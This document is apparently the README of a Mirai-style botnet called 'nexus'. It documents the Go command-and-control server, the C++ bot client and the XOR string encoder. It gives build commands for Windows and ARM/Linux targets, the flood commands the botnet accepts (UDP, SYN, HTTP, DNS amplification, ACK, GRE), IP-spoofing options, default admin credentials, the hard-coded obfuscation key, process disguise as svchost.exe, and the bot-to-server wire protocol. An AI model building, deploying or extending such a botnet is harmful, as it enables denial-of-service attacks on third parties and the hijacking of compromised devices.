# nexus

A modernized Mirai-architecture botnet — clean C++17 bot client, Go CNC server.

Built as reference material. Clean, modular, compiles out of the box.

## Architecture

```
cnc/         Go CNC server — telnet admin console, bot manager, attack dispatch
bot/src/     C++17 bot client — UDP/SYN/HTTP/DNS/ACK/STOMP/GRE floods, XOR obfuscation
tools/       enc.cpp — XOR string encoder for the obfuscation table
```

## CNC Server

```powershell
cd cnc
go build -o nexus-cnc.exe .
.\nexus-cnc.exe -port 19443
```

Default admin credentials: `admin` / `nexus`

Telnet in: `telnet localhost 19443`

### CNC Commands

| Command | Description |
|---------|-------------|
| `attack udp 1.2.3.4:80 duration=60` | Launch UDP flood |
| `attack syn 10.0.0.1:443 duration=300 threads=4` | TCP SYN flood |
| `attack http example.com method=GET path=/ host=example.com` | HTTP flood |
| `bots` | List connected bots |
| `users` / `users add <name> <pass>` | User management |
| `history` | Attack history |

### Attack Types

| Type | Layer | Notes |
|------|-------|-------|
| `udp` | 4 | Randomized payload UDP flood |
| `syn` | 4 | Raw socket SYN flood (needs admin/root) |
| `http` | 7 | HTTP GET/POST/HEAD flood with randomized UA |
| `dns` | 4 | DNS amplification via open resolvers |
| `ack` | 4 | TCP ACK flood (bypasses stateless firewalls) |
| `stomp` | 4 | Rapid SYN-connect-RST cycle |
| `greip` | 3 | GRE IP tunnel flood |

### CNC Options

```
duration=N     seconds (default: 60, max: 86400)
pkt_size=N     packet size in bytes (UDP/SYN)
threads=N      worker threads (1-255)
method=GET     HTTP method
path=/         HTTP path
host=X         HTTP Host header
src_port=N     source port
spoofed=1      IP spoofing (needs no egress filtering)
```

## Bot Client

```cmd
cd bot
build.bat              # release x64
build.bat debug        # debug build
```

```cmd
.\nexus-bot.exe 192.168.1.100 19443
```

### Bot Features

- **7 attack vectors**: UDP, SYN, HTTP, DNS amp, ACK, STOMP, GRE IP
- **XOR string obfuscation**: all sensitive strings encrypted in binary (key: 0x45F83A21)
- **Process disguise**: hides as `svchost.exe` on Windows
- **Single-instance mutex**: prevents duplicate execution
- **Auto-reconnect**: 30-second retry on disconnect
- **Keepalive pings**: 60-second heartbeat to CNC

### Build Targets

| Platform | Compiler | Command |
|----------|----------|---------|
| Windows x64 | MSVC 2022 | `build.bat` |
| Windows x86 | MSVC 2022 | `build.bat x86` |
| Linux x86_64 | g++ | `g++ -std=c++17 -O2 -static src/*.cpp -o nexus-bot -lpthread` |
| Linux ARM | arm-linux-gnueabi-g++ | `arm-linux-gnueabi-g++ -std=c++17 -O2 -static src/*.cpp -o nexus-bot -lpthread` |

## String Obfuscation

```powershell
cd tools
g++ -std=c++17 -o enc.exe enc.cpp
.\enc.exe "your-cnc-domain.com"
```

Paste the output into `bot/src/obfuscate.cpp`'s `store_plaintext(Id::CNC_DOMAIN, ...)`.

## Wire Protocol

Bot ↔ CNC binary protocol:

```
BOT → CNC (handshake):
  [4] magic 0x00000001  [2] arch_len  [N] arch_string

CNC → BOT (response):
  [4] bot_id (0 = reject)

BOT → CNC (keepalive, every 60s):
  [2] 0x0000

CNC → BOT (attack command):
  [2] total_len  [4] attack_id  [4] duration_secs
  [1] attack_type  [1] target_count
  [N] targets (each: [4] ipv4 [2] port)
  [1] option_count
  [N] options (each: [1] key [1] val_len [N] val)
```
